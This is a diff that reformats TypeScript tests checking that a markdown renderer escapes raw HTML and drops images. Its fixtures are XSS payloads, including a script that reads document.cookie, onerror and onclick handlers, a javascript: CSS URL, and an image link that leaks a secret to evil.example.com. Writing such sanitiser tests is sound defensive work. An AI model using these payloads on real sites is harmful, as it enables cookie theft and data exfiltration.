@@ -13,7 +13,7 @@ import { balanceIncompleteMarkdown, renderMarkdown } from "./markdown";
 
 describe("chaos: renderMarkdown never lets raw HTML/script through", () => {
   it("neutralises a raw <script> tag in the source to inert text, never executable markup", () => {
-    const html = renderMarkdown('before<script>alert(document.cookie)</script>after');
+    const html = renderMarkdown("before<script>alert(document.cookie)</script>after");
     expect(html).not.toContain("<script");
     expect(html).not.toContain("alert(document.cookie)</script>"); // not left as live markup
   });
@@ -22,20 +22,27 @@ describe("chaos: renderMarkdown never lets raw HTML/script through", () => {
     ["onerror on an img tag", '<img src=x onerror="alert(1)">', "<img"],
     ["onclick on a div", '<div onclick="alert(1)">click me</div>', "<div onclick"],
     ["an iframe", '<iframe src="https://evil.example.com"></iframe>', "<iframe"],
-    ["an svg with an embedded script", '<svg><script>alert(1)</script></svg>', "<svg"],
-    ["a style attribute (CSS injection)", '<p style="background:url(javascript:alert(1))">x</p>', "<p style"],
+    ["an svg with an embedded script", "<svg><script>alert(1)</script></svg>", "<svg"],
+    [
+      "a style attribute (CSS injection)",
+      '<p style="background:url(javascript:alert(1))">x</p>',
+      "<p style",
+    ],
     ["an object/embed tag", '<object data="evil.swf"></object>', "<object"],
-  ])("neutralises raw HTML (%s) to escaped, inert text rather than live markup", (_label, source, rawNeedle) => {
-    const html = renderMarkdown(source);
-    // marked's overridden `html` renderer (markdown.ts) escapes any raw
-    // `<...>` sequence to entities BEFORE DOMPurify ever runs — so none of
-    // this ever becomes real, interactive markup, no matter what DOMPurify's
-    // own allowlist would have done with it.
-    expect(html).not.toContain(rawNeedle);
-    expect(html).not.toContain("<script");
-    expect(html).not.toContain("<iframe");
-    expect(html).not.toContain("<object");
-  });
+  ])(
+    "neutralises raw HTML (%s) to escaped, inert text rather than live markup",
+    (_label, source, rawNeedle) => {
+      const html = renderMarkdown(source);
+      // marked's overridden `html` renderer (markdown.ts) escapes any raw
+      // `<...>` sequence to entities BEFORE DOMPurify ever runs — so none of
+      // this ever becomes real, interactive markup, no matter what DOMPurify's
+      // own allowlist would have done with it.
+      expect(html).not.toContain(rawNeedle);
+      expect(html).not.toContain("<script");
+      expect(html).not.toContain("<iframe");
+      expect(html).not.toContain("<object");
+    },
+  );
 
   it("drops <img> entirely (never renders an <img> tag) — no data-exfiltration channel via an attacker-controlled src", () => {
     const html = renderMarkdown("![alt text](https://evil.example.com/pixel.png?leak=secret)");
@@ -130,7 +137,7 @@ describe("chaos: balanceIncompleteMarkdown on pathological mid-stream input", ()
   });
 
   it("leaves an odd-count fenced code block UNTOUCHED rather than corrupting it with a synthetic inline closer", () => {
-    const source = "```js\nfunction f() {\n  return \"**not bold**\";\n";
+    const source = '```js\nfunction f() {\n  return "**not bold**";\n';
     const balanced = balanceIncompleteMarkdown(source);
     // The comment on hasUnterminatedFence explains why: balancing THROUGH an
     // open fence could land a synthetic marker on the wrong side of the
